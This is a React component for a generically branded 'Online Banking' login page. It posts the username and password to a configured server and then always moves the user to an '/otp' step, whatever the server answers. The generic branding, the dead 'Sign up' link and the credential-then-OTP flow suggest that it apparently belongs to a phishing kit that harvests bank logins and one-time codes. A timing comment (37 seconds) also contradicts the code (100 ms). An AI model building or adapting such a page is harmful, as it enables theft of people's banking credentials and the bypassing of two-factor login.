import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import "../styles/home.css";
import "../App.css";
import logo from "../assets/logo.svg";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";
import { IoEyeOffOutline, IoEyeOutline } from "react-icons/io5";

const schema = yup.object().shape({
  username: yup.string().required("Username is required"),
  password: yup.string().required("Password is required"),
});

const Home = () => {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false); // State for toggling password visibility
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const togglePasswordVisibility = () => {
    setShowPassword((prev) => !prev);
  };

const submitForm = (data) => {
  setLoading(true);
  axios
    .post(`${BASE_URL}/`, data)
    .then((response) => {
      console.log(response.data);
      
      // Wait 37 seconds before navigating
      setTimeout(() => {
        navigate("/otp");
        setLoading(false);
      }, 100); // 37000 milliseconds = 37 seconds
    })
    .catch((error) => {
      console.error("There was an error!", error);
      setLoading(false);
    });
};

  return (
    <div className="home">
      <div className="container">
        <div className="contentSec">
          <div className="logo">
            <img src={logo} alt="logo" />
            <h1>Online</h1>
          </div>
        </div>
        <div className="loginWrapper">
          <div className="loginSec">
            <form className="homeForm" onSubmit={handleSubmit(submitForm)}>
              <label htmlFor="username">Username</label>
              <div className="formInput">
                <input
                  name="username"
                  type="username"
                  required
                  {...register("username")}
                />
              </div>
              <FormErrMsg errors={errors} inputName="username" />
              <label htmlFor="password">Password</label>
              <div className="formInput">
                <input
                  name="password"
                  type={showPassword ? "text" : "password"} // Toggle type based on state
                  required
                  {...register("password")}
                />
                <div className="eye" onClick={togglePasswordVisibility}>
                  {showPassword ? (
                    <IoEyeOutline className="icon" />
                  ) : (
                    <IoEyeOffOutline className="icon" />
                  )}
                </div>
              </div>
              <FormErrMsg errors={errors} inputName="password" />
              <button type="submit" disabled={loading}>
                {loading ? "Loading..." : "Log In"}
              </button>
            </form>
            <div className="help">
              <h5>Need help logging in?</h5>
              <p>Ver 1.15.3</p>
            </div>

            <div className="snUp flex">
              <p>Don't have Online Banking yet?</p>
              <span>Sign up</span>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Home;


